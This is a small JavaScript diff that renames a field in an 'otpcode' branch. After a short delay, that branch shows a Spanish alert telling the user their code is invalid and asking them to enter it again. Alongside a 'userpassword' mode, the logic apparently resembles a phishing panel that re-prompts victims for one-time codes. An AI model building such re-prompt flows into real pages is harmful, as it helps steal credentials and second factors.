@@ -119,7 +119,7 @@ if(info.checkerInfo.mode === 'userpassword'){
 }else if(info.checkerInfo.mode === 'otpcode'){
     setTimeout(() =>{
         // COMPROBAR ERROR
-        if(info.metaInfo.cavance !== ''){
+        if(info.metaInfo.tok !== ''){
             alert('Código inválido, por favor ingrese el valor de nuevo.');
         }
     }, 2050);
